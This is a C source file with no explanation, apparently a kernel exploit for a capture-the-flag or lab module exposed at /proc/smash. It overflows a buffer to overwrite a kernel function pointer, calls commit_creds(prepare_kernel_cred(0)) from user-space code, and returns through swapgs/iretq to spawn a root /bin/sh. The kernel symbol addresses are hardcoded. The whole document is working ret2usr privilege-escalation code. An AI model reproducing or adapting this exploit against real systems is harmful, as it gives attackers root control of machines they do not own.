#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>

struct TrapFrame{
	void* rip;
	unsigned long user_cs;
	unsigned long user_rflags;
	void* rsp;
	unsigned long user_ss;
} __attribute__((packed));

void *(*prepare_kernel_cred)(void *);
int (*commit_creds)(void *);
struct TrapFrame tf;

// commit cred
static void lpe() {commit_creds(prepare_kernel_cred(0));}

// get shell
static void shell() {
	system("/bin/sh");
	exit(0);
}


static void save() {
	asm(
		"xor %rax, %rax;"
		"mov %cs, %ax;"
		"pushq %rax; popq tf+8;"
		"pushfq; popq tf+16;"
		"pushq %rsp; popq tf+24;"
		"mov %ss, %ax;"
		"pushq %rax; popq tf+32;"
	);
	tf.rip = &shell;
	tf.rsp -= 1024;
}

static void restore() {
	asm(
		"movq $tf, %rsp;"
		"swapgs ;"
		"iretq;"
	);
}

static void root_shell() {
	lpe();
	restore();
}

int main(int argc, char const *argv[])
{
	commit_creds = (void*)0xffffffff9f67f4e0;
	prepare_kernel_cred=(void*)0xffffffff9f67f810;
	save();
	int fd = open("/proc/smash", O_RDWR);
	if (fd == -1)
	{
		puts("Unable to open file");
		exit(-1);
	}
	char buf[100] ={0};
	strncpy(buf, "AAAAAAAA", 8);
	// strncpy(&buf[8], "BBBBBBBB",8);
	*(void**)(buf+8) = &root_shell;

	write(fd,buf,16);
	return 0;
}